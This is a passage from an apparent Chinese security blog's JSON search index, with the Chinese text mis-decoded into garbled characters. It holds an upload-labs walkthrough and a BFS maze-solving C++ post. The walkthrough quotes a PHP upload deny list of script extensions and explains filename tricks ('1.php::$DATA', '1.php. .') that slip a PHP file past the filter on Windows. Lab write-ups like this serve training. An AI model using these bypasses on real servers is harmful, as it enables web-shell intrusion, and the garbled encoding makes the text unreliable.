ä»”ç»†è§‚å¯Ÿå‘ç°å°‘äº†è¿™æ®µä»£ç  $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA é‡‡ç”¨Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡ å°†æ–‡ä»¶åæ”¹ä¸º 1.php::$DATA,ä½†æ˜¯å®è´¨ä¸Šä¿å­˜çš„æ–‡ä»¶è¿˜æ˜¯1.php pass10$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; &#125; è¿™ä¸€å¥ä»£ç æ˜¯ç”¨æ¥æ£€æµ‹æœ«å°¾æ˜¯å¦æ˜¯.ï¼Œå¯ä»¥åŒå†™ç»•è¿‡ã€‚æŠ“åŒ…å°†æ–‡ä»¶åæ”¹ä¸º1.php. . ï¼ˆæ³¨æ„ä¸¤ç‚¹ä¹‹é—´æœ‰ç©ºæ ¼ï¼‰ å‰é¢å»æ‰.ç„¶åæ£€éªŒ.ä¸å­˜åœ¨ï¼Œå†å»ç©ºæ ¼ï¼Œç•™ä¸‹php.ï¼Œç„¶åphp.ä¸å±äº$deny_extæ•°ç»„ä¸­å­˜åœ¨çš„ï¼Œå½“ç„¶å°±ç›´æ¥æäº¤äº†ã€‚å› ä¸ºwindowsè‡ªåŠ¨å»ç‚¹ï¼Œäºæ˜¯phpåç¼€å°±å‡ºæ¥äº†","tags":[{"name":"MIME","slug":"MIME","permalink":"https://sunzhengyu99.github.io/tags/MIME/"},{"name":"å¤§å°å†™ç»•è¿‡","slug":"å¤§å°å†™ç»•è¿‡","permalink":"https://sunzhengyu99.github.io/tags/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":".htaccess","slug":"htaccess","permalink":"https://sunzhengyu99.github.io/tags/htaccess/"},{"name":"windowsæ–‡ä»¶ç‰¹æ€§","slug":"windowsæ–‡ä»¶ç‰¹æ€§","permalink":"https://sunzhengyu99.github.io/tags/windows%E6%96%87%E4%BB%B6%E7%89%B9%E6%80%A7/"}]},{"title":"è¿·å®«é—®é¢˜","date":"2020-03-20T10:07:12.000Z","path":"2020/03/20/è¿·å®«é—®é¢˜/","text":"è¿·å®«é—®é¢˜ åŸé¢˜é¢˜ç›®æè¿° å°æ˜ç½®èº«äºä¸€ä¸ªè¿·å®«ï¼Œè¯·ä½ å¸®å°æ˜æ‰¾å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ã€‚ å°æ˜åªèƒ½å‘ä¸Šä¸‹å·¦å³å››ä¸ªæ–¹å‘ç§»åŠ¨ã€‚ è¾“å…¥ è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ•´æ•°Tï¼Œè¡¨ç¤ºæœ‰Tç»„æµ‹è¯•æ•°æ®ã€‚ æ¯ç»„è¾“å…¥çš„ç¬¬ä¸€è¡Œæ˜¯ä¸¤ä¸ªæ•´æ•°Nå’ŒMï¼ˆ1&lt;=N,M&lt;=100ï¼‰ã€‚ æ¥ä¸‹æ¥Nè¡Œï¼Œæ¯è¡Œè¾“å…¥Mä¸ªå­—ç¬¦ï¼Œæ¯ä¸ªå­—ç¬¦è¡¨ç¤ºè¿·å®«ä¸­çš„ä¸€ä¸ªå°æ–¹æ ¼ã€‚ å­—ç¬¦çš„å«ä¹‰å¦‚ä¸‹ï¼šâ€˜Sâ€™ï¼šèµ·ç‚¹â€˜Eâ€™ï¼šç»ˆç‚¹â€˜-â€™ï¼šç©ºåœ°ï¼Œå¯ä»¥é€šè¿‡â€˜#â€™ï¼šéšœç¢ï¼Œæ— æ³•é€šè¿‡ è¾“å…¥æ•°æ®ä¿è¯æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªèµ·ç‚¹å’Œç»ˆç‚¹ã€‚ è¾“å‡º å¯¹äºæ¯ç»„è¾“å…¥ï¼Œè¾“å‡ºä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯ç¨‹ï¼Œå¦‚æœä¸å­˜åœ¨ä»èµ·ç‚¹åˆ°ç»ˆç‚¹çš„è·¯ï¼Œåˆ™è¾“å‡º-1ã€‚ æ ·ä¾‹è¾“å…¥1 5 5 s-### ----- ##--- E#--- ---##æ ·ä¾‹è¾“å‡º9è§£å†³ä»£ç #include&lt;iostream&gt; #include&lt;cstring&gt; #include&lt;string&gt; #include&lt;queue&gt; #include &lt;algorithm&gt; using namespace std; int de[100][100];//è®¡æ­¥æ•°ç»„ è®°å½•èµ°åˆ°è¿™ä¸ªä½ç½®æ‰€éœ€çš„æ­¥æ•° ä¸èƒ½èµ°åˆ°çš„ä½ç½®æ ‡è®°ä¸º-1 char map[100][100]; //ç”¨äºå­˜æ”¾è¿·å®«åœ°å›¾ typedef pair&lt;int,intP; //åæ ‡ int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //åœ¨å½“å‰åæ ‡ä¸‹èƒ½èµ°çš„å››ä¸ªæ–¹å‘ int sx,ex,sy,ey; //(sx,sy)ä¸ºèµ·ç‚¹åæ ‡ ï¼ˆex,eyï¼‰ä¸ºç»ˆç‚¹åæ ‡ int x,y,nx,ny; //(x,y)ä¸ºå‡½æ•°ä¸­å½“å‰ä½ç½®åæ ‡ ï¼ˆnx,ny)ä¸ºæ¥ä¸‹æ¥èƒ½åˆ°è¾¾çš„åæ ‡ int r,l; //rä¸ºè¡Œæ•° lä¸ºåˆ—æ•° int bfs() &#123; memset(de,-1,sizeof(de)); queue&lt;Pqu; qu.push(P(sx,sy)); //å°†èµ·ç‚¹åæ ‡æ”¾å…¥é˜Ÿå¤´ de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //å–å‡ºé˜Ÿå¤´åæ ‡ qu.pop() ;//åˆ é™¤å¯¹å¤´åŠèµ°è¿‡çš„åæ ‡ x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //åˆ°è¾¾ç»ˆç‚¹ è·³å‡ºå¾ªç¯ for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//å¼€å§‹å‘å››ä¸ªæ–¹å‘ç§»åŠ¨ ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!=&#x27;#&#x27;&amp;&amp;de[nx][ny]==-1) //åˆ¤æ–­æ˜¯å¦è¶Šç•Œ ä»¥åŠæ˜¯å¦èƒ½èµ° æ’é™¤èµ°è¿‡çš„è·¯ &#123; qu.push(P(nx,ny)); //å°†èƒ½èµ°çš„åæ ‡æ”¾å…¥é˜Ÿåˆ— ä¹‹åä¾æ¬¡åˆ é™¤ de[nx][ny]=de[x][y]+1; //æ­¥æ•°åŠ ä¸€ &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //ç»ˆç‚¹çš„è®°æ­¥æ•°ç»„ä¸º-1 åŠä¸èƒ½åˆ°è¾¾ç»ˆç‚¹ else return de[ex][ey]; &#125; int main() &#123; int n,i,j; while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]==&#x27;S&#x27;) //è®°å½•èµ·ç‚¹åæ ‡ &#123; sx=i,sy=j; &#125; else if(map[i][j]==&#x27;E&#x27;) //è®°å½•ç»ˆç‚¹åæ ‡ &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0; &#125;","tags":[{"name":"bfs","slug":"bfs","permalink":"https://sunzhengyu99.github.io/tags/bfs/"}]}]